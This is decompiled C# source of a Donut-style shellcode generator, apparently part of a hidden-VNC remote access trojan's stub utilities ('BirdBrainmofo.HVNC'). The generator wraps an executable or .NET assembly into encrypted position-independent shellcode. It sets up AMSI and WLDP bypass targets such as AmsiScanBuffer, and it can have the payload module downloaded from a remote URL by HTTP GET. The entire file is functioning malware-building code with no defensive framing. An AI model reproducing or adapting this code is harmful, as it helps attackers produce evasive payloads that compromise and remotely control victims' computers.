using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using BirdBrainmofo.HVNC.StubUtils.Donut.Structs;
using Microsoft.CSharp.RuntimeBinder;

namespace BirdBrainmofo.HVNC.StubUtils.Donut
{
	// Token: 0x020000B6 RID: 182
	public class Generator
	{
		// Token: 0x0600087A RID: 2170 RVA: 0x0005B81C File Offset: 0x00059A1C
		public static int Donut_Create(ref DSConfig config)
		{
			DSFileInfo dsfileInfo = new DSFileInfo
			{
				ver = new char[32]
			};
			int num = Helper.ParseConfig(ref config, ref dsfileInfo);
			int num2;
			if (num != 0)
			{
				num2 = num;
			}
			else
			{
				num = CreateModule(ref config, ref dsfileInfo);
				if (num != 0)
				{
					num2 = num;
				}
				else
				{
					num = CreateInstance(ref config);
					if (num != 0)
					{
						num2 = num;
					}
					else
					{
						num = GenerateOutput(ref config);
						if (num != 0)
						{
							num2 = num;
						}
						else
						{
							num2 = 0;
						}
					}
				}
			}
			return num2;
		}

		// Token: 0x0600087B RID: 2171 RVA: 0x0005B88C File Offset: 0x00059A8C
		public static int CreateModule(ref DSConfig config, ref DSFileInfo dsfileInfo_0)
		{
			Console.WriteLine("\nPayload options:");
			if (Generator.lolo__1.lolp__0 == null)
			{
				Generator.lolo__1.lolp__0 = CallSite<Func<CallSite, object, DSModule>>.Create(Binder.Convert(CSharpBinderFlags.None, typeof(DSModule), typeof(Generator)));
			}
			DSModule dsmodule = Generator.lolo__1.lolp__0.Target(Generator.lolo__1.lolp__0, new Helper().InitStruct("DSModule"));
			dsmodule.type = dsfileInfo_0.type;
			if (dsmodule.type == 1 || dsmodule.type == 2)
			{
				if (config.domain[0] == '\0')
				{
					Helper.Copy(config.domain, Helper.RandomString(8));
				}
				Console.WriteLine("\tDomain:\t" + Helper.String(config.domain));
				Helper.Unicode(dsmodule.domain, Helper.String(config.domain));
				if (config.runtime[0] == '\0')
				{
					config.runtime = dsfileInfo_0.ver;
				}
				Console.WriteLine("\tRuntime:" + Helper.String(config.runtime));
				Helper.Unicode(dsmodule.runtime, Helper.String(config.runtime));
			}
			if (config.param != null)
			{
				string[] array = Helper.String(config.param).Split(',', ';');
				for (int i = 0; i < array.Length; i++)
				{
					Helper.Unicode(dsmodule.gstruct2_0[i].param, array[i]);
					dsmodule.param_cnt++;
				}
				if (array[0] == "")
				{
					dsmodule.param_cnt = 0;
				}
			}
			dsmodule.len = Convert.ToUInt32(new FileInfo(Helper.String(config.file)).Length);
			config.mod = dsmodule;
			config.mod_len = Convert.ToUInt32(Marshal.SizeOf(typeof(DSModule))) + dsmodule.len;
			return 0;
		}

		// Token: 0x0600087C RID: 2172 RVA: 0x0005BA74 File Offset: 0x00059C74
		public static unsafe int CreateInstance(ref DSConfig config)
		{
			uint num = Convert.ToUInt32(Marshal.SizeOf(typeof(DSInstance)));
			if (Generator.lolo__2.lolp__0 == null)
			{
				Generator.lolo__2.lolp__0 = CallSite<Func<CallSite, object, DSInstance>>.Create(Binder.Convert(CSharpBinderFlags.None, typeof(DSInstance), typeof(Generator)));
			}
			DSInstance dsinstance = Generator.lolo__2.lolp__0.Target(Generator.lolo__2.lolp__0, new Helper().InitStruct("DSInstance"));
			if (config.inst_type == 1)
			{
				num += Convert.ToUInt32(Marshal.SizeOf(typeof(DSModule)) + 32) + Convert.ToUInt32(config.mod_len);
			}
			byte[] array = Helper.RandomBytes(32);
			for (int i = 0; i < array.Length; i++)
			{
				if (i < 16)
				{
					dsinstance.key.ctr[i] = array[i];
				}
				else
				{
					dsinstance.key.byte_0[i - 16] = array[i];
				}
			}
			array = Helper.RandomBytes(32);
			for (int j = 0; j < array.Length; j++)
			{
				if (j < 16)
				{
					dsinstance.mod_key.ctr[j] = array[j];
				}
				else
				{
					dsinstance.mod_key.byte_0[j - 16] = array[j];
				}
			}
			Helper.Copy(dsinstance.sig, Helper.RandomString(8));
			dsinstance.ulong_0 = BitConverter.ToUInt64(Helper.RandomBytes(8), 0);
			Helper.APIImports(ref dsinstance);
			if (config.mod_type == 1 || config.mod_type == 2)
			{
				dsinstance.xIID_AppDomain = Constants.xIID_AppDomain;
				dsinstance.xIID_ICLRMetaHost = Constants.xIID_ICLRMetaHost;
				dsinstance.xCLSID_CLRMetaHost = Constants.xCLSID_CLRMetaHost;
				dsinstance.xIID_ICLRRuntimeInfo = Constants.xIID_ICLRRuntimeInfo;
				dsinstance.xIID_ICorRuntimeHost = Constants.xIID_ICorRuntimeHost;
				dsinstance.xCLSID_CorRuntimeHost = Constants.xCLSID_CorRuntimeHost;
			}
			Helper.Copy(dsinstance.amsi.char_0, "AMSI");
			Helper.Copy(dsinstance.amsiInit, "AmsiInitialize");
			Helper.Copy(dsinstance.amsiScanBuf, "AmsiScanBuffer");
			Helper.Copy(dsinstance.amsiScanStr, "AmsiScanString");
			Helper.Copy(dsinstance.clr, "CLR");
			Helper.Copy(dsinstance.wldp, "WLDP");
			Helper.Copy(dsinstance.wldpQuery, "WldpQueryDynamicCodeTrust");
			Helper.Copy(dsinstance.wldpIsApproved, "WldpIsClassInApprovedList");
			dsinstance.type = config.inst_type;
			if (dsinstance.type == 2)
			{
				dsinstance.http.url = new char[256];
				dsinstance.http.req = new char[8];
				config.modname = Helper.RandomString(8).ToCharArray();
				Helper.Copy(dsinstance.http.url, Helper.String(config.url) + Helper.String(config.modname));
				Helper.Copy(dsinstance.http.req, "GET");
			}
			dsinstance.mod_len = config.mod_len;
			dsinstance.len = num;
			config.inst = dsinstance;
			config.inst_len = num;
			dsinstance.mac = Helper.Maru(Helper.String(dsinstance.sig), ref dsinstance);
			IntPtr intPtr = Marshal.AllocHGlobal(Convert.ToInt32(config.inst_len));
			Marshal.StructureToPtr(dsinstance, intPtr, false);
			IntPtr intPtr2 = Marshal.AllocHGlobal(Convert.ToInt32(config.mod_len));
			Marshal.StructureToPtr(config.mod, intPtr2, false);
			int num2 = Marshal.OffsetOf(typeof(DSInstance), "api_cnt").ToInt32();
			IntPtr intPtr3 = IntPtr.Add(intPtr, num2);
			int num3 = Marshal.OffsetOf(typeof(DSInstance), "module").ToInt32();
			IntPtr intPtr4 = IntPtr.Add(intPtr, num3);
			int num4 = Marshal.OffsetOf(typeof(DSModule), "data").ToInt32();
			Buffer.MemoryCopy(intPtr2.ToPointer(), intPtr4.ToPointer(), Marshal.SizeOf(typeof(DSModule)), Marshal.SizeOf(typeof(DSModule)));
			if (dsinstance.type == 1)
			{
				byte[] array2 = File.ReadAllBytes(Helper.String(config.file));
				IntPtr intPtr5 = Marshal.AllocHGlobal(array2.Length);
				Marshal.Copy(array2, 0, intPtr5, array2.Length);
				Buffer.MemoryCopy(intPtr5.ToPointer(), IntPtr.Add(intPtr4, num4).ToPointer(), config.mod.len, config.mod.len);
				Marshal.FreeHGlobal(intPtr5);
			}
			Marshal.FreeHGlobal(intPtr2);
			Helper.Encrypt(dsinstance.key.byte_0, dsinstance.key.ctr, intPtr3, Convert.ToUInt32((long)(dsinstance.len - (ulong)num2)));
			int num5 = Shellcode(ref config, intPtr);
			int num6;
			if (num5 != 0)
			{
				num6 = num5;
			}
			else
			{
				num6 = 0;
			}
			return num6;
		}

		// Token: 0x0600087D RID: 2173 RVA: 0x0005BF24 File Offset: 0x0005A124
		public static int Shellcode(ref DSConfig config, IntPtr instptr)
		{
			if (config.arch == 1)
			{
				config.pic_len = Convert.ToUInt32(Constants.PAYLOAD_EXE_x86.Length + Convert.ToInt32(config.inst_len) + 32);
				config.pic = Marshal.AllocHGlobal(Marshal.SizeOf(config.pic_len));
			}
			else if (config.arch == 2)
			{
				config.pic_len = Convert.ToUInt32(Constants.PAYLOAD_EXE_x64.Length + Convert.ToInt32(config.inst_len) + 32);
				config.pic = Marshal.AllocHGlobal(Marshal.SizeOf(config.pic_len));
			}
			else if (config.arch == 3)
			{
				config.pic_len = Convert.ToUInt32(Constants.PAYLOAD_EXE_x86.Length + Constants.PAYLOAD_EXE_x64.Length + Convert.ToInt32(config.inst_len) + 32);
				config.pic = Marshal.AllocHGlobal(Convert.ToInt32(config.pic_len));
			}
			Helper.PUT_BYTE(232, ref config);
			Helper.PUT_WORD(BitConverter.GetBytes(config.inst_len), ref config);
			Helper.PUT_INST(instptr, Convert.ToInt32(config.inst_len), ref config);
			Helper.PUT_BYTE(89, ref config);
			if (config.arch == 1)
			{
				Helper.PUT_BYTE(90, ref config);
				Helper.PUT_BYTE(81, ref config);
				Helper.PUT_BYTE(82, ref config);
				Helper.PUT_BYTES(Constants.PAYLOAD_EXE_x86, Constants.PAYLOAD_EXE_x86.Length, ref config);
			}
			else if (config.arch == 2)
			{
				Helper.PUT_BYTES(Constants.PAYLOAD_EXE_x64, Constants.PAYLOAD_EXE_x64.Length, ref config);
			}
			else if (config.arch == 3)
			{
				Helper.PUT_BYTE(49, ref config);
				Helper.PUT_BYTE(192, ref config);
				Helper.PUT_BYTE(72, ref config);
				Helper.PUT_BYTE(15, ref config);
				Helper.PUT_BYTE(136, ref config);
				Helper.PUT_WORD(BitConverter.GetBytes(Constants.PAYLOAD_EXE_x64.Length), ref config);
				Helper.PUT_BYTES(Constants.PAYLOAD_EXE_x64, Constants.PAYLOAD_EXE_x64.Length, ref config);
				Helper.PUT_BYTE(90, ref config);
				Helper.PUT_BYTE(81, ref config);
				Helper.PUT_BYTE(82, ref config);
				Helper.PUT_BYTES(Constants.PAYLOAD_EXE_x86, Constants.PAYLOAD_EXE_x86.Length, ref config);
			}
			return 0;
		}

		// Token: 0x0600087E RID: 2174 RVA: 0x0005C124 File Offset: 0x0005A324
		public static int GenerateOutput(ref DSConfig config)
		{
			Helper.WriteOutput(ref config);
			return 0;
		}

		// Token: 0x0600087F RID: 2175 RVA: 0x0005C138 File Offset: 0x0005A338
		public static int CompileLoader()
		{
			return 0;
		}

		// Token: 0x06000880 RID: 2176 RVA: 0x00006F52 File Offset: 0x00005152

        // Token: 0x020000B7 RID: 183
		[CompilerGenerated]
		private static class lolo__1
		{
			// Token: 0x0400068B RID: 1675
			public static CallSite<Func<CallSite, object, DSModule>> lolp__0;
		}

		// Token: 0x020000B8 RID: 184
		[CompilerGenerated]
        static class lolo__2
		{
			// Token: 0x0400068C RID: 1676
			public static CallSite<Func<CallSite, object, DSInstance>> lolp__0;
		}
	}
}
